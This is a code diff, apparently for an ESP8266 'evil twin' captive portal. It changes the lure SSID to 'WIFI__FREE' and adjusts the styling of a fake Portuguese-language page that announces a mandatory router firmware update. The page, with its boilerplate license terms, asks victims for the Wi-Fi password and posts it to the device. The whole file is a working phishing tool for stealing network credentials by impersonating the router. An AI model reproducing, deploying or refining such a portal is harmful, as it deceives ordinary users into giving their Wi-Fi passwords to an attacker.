@@ -5,10 +5,12 @@
 #include <EEPROM.h>
 
 // Default SSID name
-const char* SSID_NAME = "MARIAH";
+const char* SSID_NAME = "WIFI__FREE";
+
+//Colors
+String COLOR_PRIMARY = "#159a51";
 
 // Default main strings
-String COLOR_PRIMARY = "#56687d";
 #define SUBTITLE "Roteador info."
 #define TITLE "Atualização de Firware Obrigatória"
 #define BODY "Uma atualização de segurança obrigatória está disponível para o seu roteador. Por favor leia os termos da licença antes de realizar a instalação."
@@ -21,11 +23,11 @@ String TERMS = "1. LICENSE.\n"
 
   "\nSubject to the terms and conditions of this Software License Agreement, this product hereby grants you a restricted, limited, non-exclusive, non-transferable, license to use the product Firmware/Software/Drivers only in conjunction with  products. The company does not grant you any license rights in any patent, copyright or other intellectual property rights owned by or licensed."
   
-  "\n2. NO WARRANTY.\n"
+  "\n\n2. NO WARRANTY.\n"
   
   "\nThe product Firmware/Software/Drivers are provided without warranty of any kind. The Company does not warrant that the functions contained in the INTRACOM TELECOM's Firmware/Software/Drivers will meet your requirements or that the operation of the router Firmware/Software/Drivers will be uninterrupted or error-free. Company hereby disclaims all warranties, express or implied, with respect to the router firmware/software/drivers, including, without limitation, any implied warranties of merchantability, fitness for a particular purpose or non-infringement."
   
-  "\n3. NO LIABILITY.\n"
+  "\n\n3. NO LIABILITY.\n"
   
   "\nIn no event shall Company or any other party which has been involved in the creation, production, or delivery of the router Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the router Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages."
 ;
@@ -61,14 +63,15 @@ String header(String t) {
   String a = String(currentSSID);
   String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
     "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-    "div { padding: 0.5em; }"
+    "div { padding: 0.5em;}"
     "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size: 30px}"
     "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
-    "textarea {width: 100%;display:block;width:100%;height:14em;padding:6px 12px;font-size:14px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075);-webkit-transition:border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;-o-transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s}"
-    ".checkbox {position:relative;display:block;margin-top:10px;margin-bottom:10px;}"
+    "textarea { width: 100%;display:block;width:95%;height:14em;padding:6px 12px;font-size:14px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075);-webkit-transition:border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;-o-transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s}"
+    ".checkbox {align-items:center;position:relative;display:flex;margin-top:10px;margin-bottom:10px;}"
     "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
     "nav { background:" + COLOR_PRIMARY +"; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
-    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } ";
+    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
+    ".check-terms{ width: 30px; }";
   String h = "<!DOCTYPE html><html>"
     "<head><title>" + a + " :: " + t + "</title>"
     "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
@@ -77,14 +80,14 @@ String header(String t) {
     "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
   return h; }
 
-String bodyHTML(){
-  String h = "<div> <label for='comment'>Termos e Condições:</label><textarea readonly rows='10' id='comment'>" + TERMS + "</textarea><div>"
-  "<div class='checkbox'><label>Eu aceito os termos e condições:<input type='checkbox'></label></div>";
+String termsHTML(){
+  String h = "<div><label for='comment'>Termos e Condições:</label><textarea readonly rows='10' id='comment'>" + TERMS + "</textarea></div>"
+  "<div class='checkbox'><label>Eu aceito os termos e condições:</label><input class='check-terms' type='checkbox'></div>";
   return h; 
 }
 
 String index() {
-  return header(TITLE) + "<div>" + BODY + bodyHTML() + "</ol></div><div><form action=/post method=post><label>Por motivo de segurança informe a senha da rede:</label>"+
+  return header(TITLE) + "<div>" + BODY + termsHTML() + "</div><div><form action=/post method=post><label>Por motivo de segurança informe a senha da rede:</label>"+
     "<input type=password name=m></input><input type=submit value=Confirmar></form>" + footer();
 }
 
